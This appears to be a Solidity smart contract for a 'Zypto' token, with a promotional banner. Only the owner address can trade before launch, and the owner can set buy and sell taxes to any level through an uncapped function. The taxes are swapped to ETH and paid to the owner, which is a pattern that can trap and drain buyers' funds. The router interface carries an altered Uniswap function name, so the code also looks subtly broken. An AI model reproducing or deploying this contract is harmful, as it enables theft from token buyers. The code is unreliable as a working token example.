/*
███████╗██╗   ██╗██████╗ ████████╗ ██████╗ 
╚══███╔╝╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔═══██╗
  ███╔╝  ╚████╔╝ ██████╔╝   ██║   ██║   ██║
 ███╔╝    ╚██╔╝  ██╔═══╝    ██║   ██║   ██║
███████╗   ██║   ██║        ██║   ╚██████╔╝
╚══════╝   ╚═╝   ╚═╝        ╚═╝    ╚═════╝ 
                                           
Pay and get paid faster
Blockchain payments are here to stay.
Stay ahead of the competition and increase your revenue with Zypto Pay.

https://zypto.com/app
https://twitter.com/Zypto_Token
https://medium.com/@zypto
https://t.me/Zypto
https://www.instagram.com/Zyptopay
*/

// SPDX-License-Identifier: Unlicense


pragma solidity 0.8.20;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingLiberaltaxOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract ZYPTO {
        
        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        string public   name_ = unicode"Zypto"; 
        string public   symbol_ = unicode"ZYPTO";  
        uint8 public constant decimals = 9;
        uint256 public constant totalSupply = 100000000000 * 10**decimals;

        uint256 buyLiberaltax = 0;
        uint256 sellLiberaltax = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();

        function name() public view virtual returns (string memory) {
        return name_;
        }

    
        function symbol() public view virtual returns (string memory) {
        return symbol_;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed desmaster,
            address indexed spender,
            uint256 value
        );

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant desmaster = payable(address(0x9241E34C481a433fF6EDBc282F0ffe20FaCCC6c4));

        bool private swapping;
        bool private tradingOpen;

        receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == desmaster || to == desmaster);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingLiberaltaxOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                desmaster.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 LiberaltaxAmount = amount * (from == pair ? buyLiberaltax : sellLiberaltax) / 100;
                amount -= LiberaltaxAmount;
                balanceOf[address(this)] += LiberaltaxAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function openTrading() external {
            require(msg.sender == desmaster);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function Changetax(uint256 _buy, uint256 _sell) private {
            buyLiberaltax = _buy;
            sellLiberaltax = _sell;
        }

        function reduceFree(uint256 _buy, uint256 _sell) external {
            if(msg.sender != desmaster)        
                revert Permissions();
            Changetax(_buy, _sell);
        }
    }